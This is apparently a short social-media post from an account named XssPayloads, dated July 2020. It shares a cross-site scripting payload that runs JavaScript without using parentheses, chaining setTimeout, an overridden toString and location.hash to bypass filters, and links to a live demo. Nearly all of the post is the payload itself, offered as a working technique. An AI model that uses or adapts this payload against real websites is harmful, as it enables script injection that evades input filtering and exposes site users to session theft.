##User: XssPayloads	Time: 20200728
> 
``` XSS without parenthesis, a variant from the @terjanq 's one by @aemkei 
onhashchange=setTimeout;
HashChangeEvent.prototype.toString=
RegExp.prototype.toString;
location.hash=
HashChangeEvent.prototype.source=
'1/-alert\501\51/';

Demo here:  https://jsbin.com/sesicetexo/edit?html,js,output …```
  
  